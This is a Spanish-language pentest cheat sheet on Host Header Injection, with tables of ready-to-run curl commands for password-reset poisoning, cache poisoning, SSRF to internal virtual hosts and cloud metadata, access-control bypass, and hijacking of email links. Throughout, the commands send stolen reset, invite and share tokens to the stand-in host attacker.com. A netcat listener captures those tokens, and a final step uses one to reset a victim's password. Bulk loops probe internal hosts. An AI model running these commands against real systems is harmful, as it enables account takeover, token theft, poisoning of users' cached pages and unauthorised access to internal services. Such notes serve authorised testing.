---
aliases:
  - HHI Password Reset Poisoning
  - HHI Cache Poisoning
  - HHI SSRF
tags:
  - vuln/host-header-injection
  - technique/credential-access
  - technique/initial-access
  - asset/web-app
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[Host Header Injection]]"
---
# Host Header Injection - Vectores Comunes

***

## Password Reset Poisoning

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -X POST -H "Host: attacker.com" -d "email=victim@target.com" https://target.com/forgot` | Reset link en email apunta a attacker.com → token leakeable | App construye URL desde Host. |
| `curl -X POST -H "Host: target.com" -H "X-Forwarded-Host: attacker.com" -d "email=victim@target.com" https://target.com/forgot` | XFH reset poisoning (más común que Host) | Backend trusts XFH header. |
| `curl -X POST -H "Host: target.com" -H "Forwarded: host=attacker.com" -d "email=victim@target.com" https://target.com/forgot` | RFC 7239 Forwarded header variant | Backend acepta Forwarded. |
| `curl -X POST -H "X-Forwarded-Host: taken.target.com" -d "email=victim@target.com" https://target.com/forgot` | Subdomain takeover combo — link parece legit | Wildcard cookie trust + SDT. |
| `nc -lvnp 80` en attacker.com → recibir `GET /reset?token=...` | Listener captura token | Post-poisoning. |
| `curl https://target.com/reset?token=$STOLEN_TOKEN -d "password=ATTACKER"` | Use stolen token en legit endpoint | Final ATO step. |
| `curl -X POST -H "Host: attacker.com" -d "email=victim@target.com" https://target.com/email/confirm` | Email confirmation hijack | Email confirm flow. |
| `curl -X POST -H "X-Forwarded-Host: attacker.com" -d "email=victim@target.com" https://target.com/login/magic` | Magic link hijack | Passwordless auth. |
^hhi-vector-reset

### Reset poisoning PoC

```http
POST /forgot HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com
Content-Type: application/x-www-form-urlencoded

email=victim@target.com
```

```
Email: "Click to reset: https://attacker.com/reset?token=eyJhbGc..."
Victim clicks → attacker logs token → uses on legit target → resets password.
```

___

## Cache Poisoning via Host

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -H "X-Forwarded-Host: attacker.com" "https://target.com/?cb=$(date +%s)"` | Inyectar Host poisoned + cache bust unique key | Pre-poison probe. |
| `curl -H "X-Forwarded-Host: attacker.com" https://target.com/login` (esperar cache hit en legit user) | Cache stores response con `<base href="//attacker.com">` → all URLs reroute | Cache layer + unkeyed XFH. |
| `curl -H "Host: attacker.com" https://target.com/?cb=$(date +%s)` | Direct Host header poison | Si Host es unkeyed (raro). |
| Burp → BApp Store → "Param Miner" → "Guess headers" | Auto-detect unkeyed inputs (XFH y otros) | Discovery automation. |
| `curl -H "X-Forwarded-Host: attacker.com" -X POST https://target.com/api/redirect` (cacheable redirect) | Open redirect via cached Location header | Mass redirect chain. |
| `curl -H "X-Forwarded-Host: attacker.com" https://target.com/feed.rss` | RSS self-link a attacker — feed reader reroute | Feed reader poisoning. |
| `curl -sI -H "X-Forwarded-Host: x" https://target/x \| grep -iE 'cf-cache-status\|x-cache\|age:'` | Verificar cache status post-injection | Cache hit confirmation. |
| Post-poison: víctima común `curl https://target.com/login` → recibe response con attacker.com en `<base>` | Mass victim impact via cached HTML | TTL del cache. |
^hhi-vector-cache

___

## SSRF a Virtual Hosts Internos

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -H "Host: admin.internal" https://target.com/` | Internal admin vhost expose | Backend routes by Host. |
| `curl -H "Host: localhost" https://target.com/` | Localhost vhost fallback | Default routing rule. |
| `curl -H "Host: 127.0.0.1" https://target.com/` | Localhost binding | Backend routes IP-based. |
| `curl -H "Host: api.internal" https://target.com/` | Internal API expose | Multi-vhost server. |
| `curl -H "Host: jenkins" https://target.com/` | Jenkins panel via Host | Internal tooling. |
| `curl -H "Host: gitlab" https://target.com/` | GitLab via Host | Same. |
| `curl -H "Host: kibana" https://target.com/` | Kibana via Host | ELK stack. |
| `for h in admin api dev staging jenkins gitlab kibana grafana 127.0.0.1 localhost; do echo "=== $h ==="; curl -sI -H "Host: $h" https://target.com/ \| head -3; done` | Bulk internal vhost probe | Discovery. |
| `curl -H "Host: 169.254.169.254" https://target.com/latest/meta-data/` | Cloud metadata via Host routing | If routed. |
| `curl -H "Host: target.com.evil.com" https://target.com/` (server name match laxo) | Bypass strict Host validation | Regex sin anchor. |
^hhi-vector-ssrf

___

## Routing-Based Access Control Bypass

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -H "Host: localhost" https://target.com/admin` | Bypass auth check basado en Host trust | "Internal traffic = no auth" anti-pattern. |
| `curl -H "Host: admin.target.com" https://target.com/admin` (admin subdomain con bypass interno) | Privesc via Host trust | Admin Host con auth disabled. |
| `curl -H "Host: trusted.target.com" -H "Authorization: Bearer x" https://target.com/api/internal` | API key bypass via Host | Trusted Host skip API key. |
| `curl -H "X-Forwarded-Host: localhost" https://target.com/admin` | XFH variant del bypass | Backend trust XFH. |
| `curl -H "X-Forwarded-For: 127.0.0.1" -H "X-Real-IP: 127.0.0.1" https://target.com/admin` | IP-based ACL bypass via spoofed IP | IP allowlist trust XFF. |
| `for h in localhost 127.0.0.1 admin admin.target.com internal trusted; do curl -sI -H "X-Forwarded-Host: $h" https://target.com/admin \| head -1; done` | Bulk Host-based ACL probe | Discovery. |
^hhi-vector-acl

___

## Email Link Generation Hijack

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -X POST -H "X-Forwarded-Host: attacker.com" -d "..." https://target.com/welcome` | Welcome email link a attacker | Welcome email construye URL desde Host. |
| `curl -X POST -H "X-Forwarded-Host: attacker.com" -d "email=victim" https://target.com/share/create` | Share token captured en attacker | Share-via-email flow. |
| `curl -X POST -H "X-Forwarded-Host: attacker.com" -d "..." https://target.com/invite` | Invite link hijack | Invite token capture. |
| `curl -X POST -H "X-Forwarded-Host: attacker.com" -d "..." https://target.com/notification` | Notification link redirect | Notification email URL. |
| `curl -X POST -H "X-Forwarded-Host: attacker.com" -d "..." https://target.com/calendar/invite` | Calendar event link | Calendar invite. |
| `curl -X POST -H "X-Forwarded-Host: attacker.com" -d "..." https://target.com/doc/share` | Doc share token capture | Doc access link. |
| `for ep in welcome share invite notification calendar doc/share unsubscribe receipt; do curl -X POST -H "X-Forwarded-Host: attacker.com" -d "..." https://target.com/$ep; done` | Bulk email-link endpoint probe | Discovery. |
^hhi-vector-email

***
